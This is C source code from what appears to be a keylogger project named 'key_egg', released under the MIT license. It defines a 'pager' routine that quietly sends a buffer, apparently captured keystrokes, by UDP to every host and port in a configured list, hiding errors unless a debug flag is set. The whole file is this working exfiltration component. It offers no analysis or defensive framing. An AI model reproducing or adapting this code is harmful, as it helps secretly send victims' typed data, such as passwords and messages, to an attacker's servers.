/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include "key_egg.h"
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>

#ifdef _PAGER

#define _PAGER_
#include "key_egg_conf.h"

int ke_pager(char *buffer) {
    char *ip;
    const char **ip_list;
    int sock;
    const unsigned short *port_list;
    struct hostent *phe;
    struct sockaddr_in to_addr;

    ip_list = pager_ip_list;
    while (*ip_list) {
        memset(&to_addr, 0x00, sizeof(struct sockaddr_in));
        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
#ifdef DEBUG
            perror("pager.c socket() failed");
#endif
            ip_list++;
            continue;
        }

        phe = gethostbyname(*ip_list);
        if (!phe) {
#ifdef DEBUG
            fprintf(stderr, "gethostbyname(%s) failed: %s\n", *ip_list,
                    strerror(errno));
#endif
            ip_list++;
            continue;
        }

        ip = inet_ntoa(*((struct in_addr *)phe->h_addr_list[0]));
        to_addr.sin_family = AF_INET;
        to_addr.sin_addr.s_addr = inet_addr(ip);

        port_list = pager_port_list;
        while (*port_list) {
            to_addr.sin_port = htons(*port_list);
            if (sendto(sock, buffer, strlen(buffer), 0,
                       (struct sockaddr *)&to_addr, sizeof(to_addr)) < 0)
#ifdef DEBUG
                perror("sendto() failed");
#else
                ;
#endif
            port_list++;
        }

        shutdown(sock, SHUT_RDWR);
        ip_list++;
    }

    return 0;
}

#endif // #ifdef  _PAGER
